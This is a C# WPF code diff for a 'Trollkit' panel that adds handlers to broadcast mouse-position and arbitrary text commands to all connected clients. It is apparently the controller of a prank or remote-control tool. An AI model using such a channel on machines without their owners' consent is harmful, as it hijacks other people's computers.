@@ -12,6 +12,8 @@ using System.Windows.Media;
 using System.Windows.Media.Imaging;
 using System.Windows.Navigation;
 using System.Windows.Shapes;
+using Trollkit_Library.Models;
+using Trollkit_Library.Modules;
 
 namespace Trollkit
 {
@@ -20,6 +22,8 @@ namespace Trollkit
     /// </summary>
     public partial class WindowsTrolls2 : UserControl
     {
+        private MainWindow ParentFrame { get { return (MainWindow)Application.Current.MainWindow; } }
+        private const string Handler = "Windows";
         public WindowsTrolls2()
         {
             InitializeComponent();
@@ -27,7 +31,16 @@ namespace Trollkit
 
         private void BtnStart_Click(object sender, RoutedEventArgs e)
         {
+            string X = TbXcoordinate.Text;
+            string Y = TbYcoordinate.Text;
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "MousePosition", Handler = Handler, Value = $"{X},{Y}"};
+            ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
+        }
 
+        private void BtnGo_Click(object sender, RoutedEventArgs e)
+        {
+            TransferCommandObject returnObject = new TransferCommandObject { Command = "Command", Handler = Handler, Value = TbComammand.Text};
+            ParentFrame.server.SendDataObjectToAll(ClientServerPipeline.BufferSerialize(returnObject));
         }
     }
 }
